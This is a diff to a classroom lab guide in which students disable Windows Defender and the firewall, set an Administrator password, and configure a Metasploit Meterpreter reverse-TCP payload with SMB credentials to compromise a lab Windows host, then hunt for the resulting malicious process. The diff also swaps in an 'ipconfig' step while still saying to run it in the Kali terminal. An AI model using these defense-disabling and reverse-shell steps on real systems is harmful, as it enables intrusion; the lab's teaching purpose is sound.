@@ -24,21 +24,26 @@ Please note, if you get red errors that say
 
 <pre>A general error occurred that is not covered by a more specific error code.</pre> 
 
+
 That is OK!  It means **Defender** was disabled.  We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...
+
+Next, lets ensure the firewall is disabled.
+
+<pre> netsh advfirewall set allprofiles state off</pre>
+
+Next, set a password for the Administrator account that you can remember
+
+<pre>net user Administrator password1234</pre>
+
+Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
 Now that we disabled **Windows Defender**, we can head back to our **Kali** terminal.
 
 Within the terminal, please run the following command:
 
-<pre>ifconfig</pre>>
+<pre>ipconfig</pre>
 
-![](attachments/windowscli_ifconfig.png)
-
-Please note the IP address of **your** Ethernet adapter. 
-
-Please note that my adapter is called **eth0** and my IP address is **172.26.19.133.**   
-
-**Your IP Address and adapter name may be different.**
+Please note your Windows IP address.
 
 Please note your IP address for the **ADHD Linux system** on a piece of paper:
 
@@ -66,7 +71,7 @@ We will continue by running this command to set the location of the payload:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-We also need to set the **RHOST IP** by using the following command:
+We also need to set the **RHOST IP** for the Windows system by using the following command:
 
 <pre>set RHOST 10.10.1.209</pre>
 
@@ -79,6 +84,8 @@ Next, we need to set the **SMB** username and password.
 <pre>set SMBUSER Administrator</pre>
 
 <pre>set SMBPASS T@GEq5%r2XJh</pre>
+
+Remember, your password will be different!  I hope!!!
 
 It should look like this:
 
@@ -158,6 +165,10 @@ Lets go through the steps we took to hunt for a malicious process
 3. As you can see above, it was launched by the cmd.exe process.  
 
 4. Note that the search we just did may turn up some other things launched by the command line as well.
+
+Now, go back to the MetaCTF Cloud Lab dashboard and destroy this lab with the Destroy Lab button.
+
+Then, reset it with the Start Lab button.
 
 ***
 
